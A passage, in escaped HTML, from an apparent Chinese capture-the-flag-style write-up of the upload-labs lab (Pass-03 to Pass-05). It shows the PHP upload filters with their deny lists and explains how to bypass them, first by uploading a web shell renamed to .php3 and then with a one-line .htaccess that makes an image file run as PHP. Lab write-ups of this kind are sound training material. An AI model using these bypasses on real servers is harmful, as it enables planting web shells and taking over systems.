&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//收尾去空
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;9999&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file,$img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 发现只过滤了&lt;code&gt;.asp、.aspx、.php、.jsp&lt;/code&gt;文件，那么可以使用&lt;code&gt;php3、phtml、phps、php5&lt;/code&gt;文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 &lt;code&gt;phtml&lt;/code&gt;作为后缀名；而php3，我的理解是php之前版本的文件后缀，如&lt;code&gt;php5&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;​ 直接把&lt;code&gt;2333.php&lt;/code&gt;改为&lt;code&gt;2333.php3&lt;/code&gt;上传打开，执行成功。完工&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTq2cV.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-04"&gt;Pass-04
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;php1&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;pHp1&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aScx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aShx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cEr&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.sWf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.swf&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//删除文件名末尾的点
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strtolower&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//转换为小写
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//去除字符串::$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//收尾去空
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;此文件不允许上传!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;​ 好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.&lt;code&gt;htaccess&lt;/code&gt;文件过滤，所以上传一个.&lt;code&gt;htaccess&lt;/code&gt;文件内容如下：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​ 原理的话我讲一下个人的见解：.&lt;code&gt;htaccess&lt;/code&gt;文件是一个&lt;code&gt;apache&lt;/code&gt;服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为&lt;code&gt;php&lt;/code&gt;。参考的博客：&lt;a class="link" href="https://www.cnblogs.com/gyrgyr/p/10773118.html" target="_blank" rel="noopener"
&gt;htaccess使用方法介绍&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;​ 接下来上传&lt;code&gt;2333.jpg&lt;/code&gt;图片木马，再打开就会被成功解析为&lt;code&gt;php&lt;/code&gt;文件并执行：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTqoN9.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BTqqc6.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 完工&lt;/p&gt;
&lt;h2 id="pass-05"&gt;Pass-05
&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $deny_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.php&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.php2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.phtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pht&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp5&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp4&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp3&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHp2&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Html&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.Htm&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.pHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jsv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jspf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSw&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSv&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jSpf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.jHtml&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aspx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ascx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.ashx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.asmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cer&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSpx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSa&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSax&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aScx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aShx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.aSmx&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.cEr&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.sWf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.swf&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;.htaccess&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;deldot&lt;/span&gt;($file_name);&lt;span style="color:#75715e"&gt;//删除文件名末尾的点
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strrchr&lt;/span&gt;($file_name, &lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $file_ext);&lt;span style="color:#75715e"&gt;//去除字符串::$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;trim&lt;/span&gt;($file_ext); &lt;span style="color:#75715e"&gt;//首尾去空
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext, $deny_ext)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;9999&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file, $img_path)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
